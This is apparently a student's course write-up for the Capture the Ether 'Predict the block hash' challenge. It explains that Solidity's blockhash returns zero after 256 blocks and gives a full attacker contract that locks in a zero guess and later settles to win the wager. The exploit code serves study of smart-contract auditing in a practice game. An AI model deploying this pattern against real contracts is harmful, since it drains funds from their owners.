## Week6 Auditing and Hacking cont.  

### Capture the Ether Predict the block hash

The objective is to predict the entire 256-bit block hash for a future block.  This is difficult and I thought I could do it in a controlled blockchain, however I could not.  One thing to note from the solidity docs:  

>The block hashes are not available for all blocks for scalability reasons. You can only access the hashes of the most recent 256 blocks, all other values will be zero.

So if we lock the contract in at block N, then wait for 256 blocks to pass calling blockhash(N) will result in 0.  We can now just lock in an answer of 0 and then wait 256 blocks to verify.  A contact doing that is given below.  

```Java
contract Attacker {
    PredictTheBlockHashChallenge challenge;
    uint public blockNum;

    function Attacker(address challengeAdd) public payable {
        require(msg.value == 1 ether);
        challenge = PredictTheBlockHashChallenge(challengeAdd);
    }

    // step 1
    function lock() external {
        bytes32 answer = 0x00000000000000000000000000000000;
        challenge.lockInGuess.value(1 ether)(answer);
    }

    // step 2, for creating transactions on simulated block chains (Ganache).  
    function incBlockNumber() external {
        blockNum = block.number;
    }

    // Step 3.
    function finish() external {
        challenge.settle();
    }
}
```